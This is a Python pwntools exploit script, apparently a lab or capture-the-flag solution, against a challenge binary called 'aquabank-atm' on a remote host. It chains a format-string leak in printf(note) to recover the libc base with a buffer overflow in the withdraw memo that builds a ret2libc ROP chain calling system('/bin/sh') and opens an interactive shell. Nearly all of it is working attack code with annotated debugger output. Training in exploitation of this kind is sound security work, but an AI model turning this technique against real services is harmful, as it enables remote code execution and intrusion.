#!/usr/bin/env python3
from pwn import *

#
 # RET2LIBC exploitation (similar to the "feedback_portal" challenge, part of the lab_03_ret2libc laboratory)
 #
 # Two-stage attack:
 # Stage 1 => format string vulnerability in printf(note) to leak a libc address
 # Stage 2 => buffer overflow in fgets(memo, 256, stdin) to implement a ret2libc ROP chain
#

context.binary = elf = ELF('./aquabank-atm', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = remote("offsec.m0lecon.it", 13596)

OFFSET_TO_RIP = 32 + 32 + 64 + 8    # also found via cyclic pattern, but can be easily calculated by looking at the source code

# By running: ROPgadget --binary ./aquabank-atm | grep "ret"
# we find that:
RET_GADGET = 0x40101a

# Stage 1: format string leak -> libc base address
# 
# The binary calls printf(note) without a format string, so we can inject
# format specifiers. Therefore, we try to send:
#       'AAAA' + '%p' * 20
# By scanning positions 1..20 we found that position 1 holds a libc pointer => NOTE: LEAK_IDX = 1 !!!
# (recognizable by the fact that the address starts with "0x7f")
#
# --- This is the output ---
# AAAA.0x7ffff7f95643.0x7ffff7f96790.0x7ffff7f96790.(nil).(nil).0x7fffffffda50.0x4014ff.0x7ffff7000a32.0x401281.0x7fffffffda60.0x401547.0x7fffffffdb78.0x7ffff7dd6f75.0x7ffff7fc7000.0x401530.0x1ffffdb60.0x7fffffffdb78.(nil).0x9e1a10ba7c840129.0x1
#
# To identify which symbol it pointed to, we ran "info symbol <leaked_address>" inside pwndbg,
# which told us that the leaked address points to "_IO_2_1_stdout_" symbol in libc.
#
# --- This is the output ---
# pwndbg> info symbol 0x7ffff7f95643
# _IO_2_1_stdout_ + 131 in section .data of /usr/lib/x86_64-linux-gnu/libc.so.6
#
# Note that there is a +131 offset from the symbol to the leaked address,
# which must be taken into account when calculating libc_base from the leak:
#   libc_base = leak - libc.symbols['_IO_2_1_stdout_'] - 131
#
# So the leak always points to "_IO_2_1_stdout_", a global FILE struct that libc
# keeps at a fixed offset from its base. The offset is a property of this specific
# libc version and NEVER changes, regardless of ASLR. Therefore, as we said above:
#   libc_base = leak - libc.symbols['_IO_2_1_stdout_'] - 131

LEAK_IDX = 1

# By running: ROPgadget --binary ./libc.so.6 | grep "pop rdi ; ret"
# we find that:
OFFSET_POP_RDI = 0x10f78b  # note that this gadget is NOT present in the binary, so we have to find it in libc;
                           # also, note that this is the OFFSET of the gadget, not its actual address

OFFSET_SYSTEM = libc.symbols['system']              # note that this is the OFFSET of the system() function, not its actual address
OFFSET_BINSH = next(libc.search(b'/bin/sh\x00'))    # note that this is the OFFSET of the "/bin/sh" string, not its actual address

# ===== PHASE 1: leak libc via format string vulnerability in printf(note) =====
p.recvuntil(b'> ')
p.sendline(b'1')    # select "Set customer note" option
p.recvuntil(b'Type your customer note: ')
note = f'%{LEAK_IDX}$p'.encode()
p.sendline(note)
p.recvuntil(b'Saved.')

p.recvuntil(b'> ')
p.sendline(b'2')     # select "Print customer note" option
p.recvuntil(b'--- Your customer note ---\n')
leak_line_raw = p.recvuntil(b'\n').strip()
p.recvuntil(b'--------------------------')
leak = int(leak_line_raw, 16)

# Now we can compute libc_base from the leak
libc_base = leak - libc.symbols['_IO_2_1_stdout_'] - 131

log.info(f'leaked address = {hex(leak)}')
log.info(f'libc_base = {hex(libc_base)}')

# ===== PHASE 2: BOF in withdraw() -> ret2libc =====
POP_RDI = libc_base + OFFSET_POP_RDI
SYSTEM = libc_base + OFFSET_SYSTEM
BINSH = libc_base + OFFSET_BINSH
 
payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(RET_GADGET),            # for stack alignment
    p64(POP_RDI), p64(BINSH),   # prepare argument for system()
    p64(SYSTEM)                 # call system("/bin/sh")
)

p.recvuntil(b'> ')
p.sendline(b'3')        # select "Withdraw" option
p.recvuntil(b'From account: ')
p.sendline(b'Cris')     # account doesn't really matter
p.recvuntil(b'Amount: ')
p.sendline(b'100')      # amount doesn't really matter
p.recvuntil(b'Withdrawal memo (be brief):')
p.send(payload)

p.interactive()
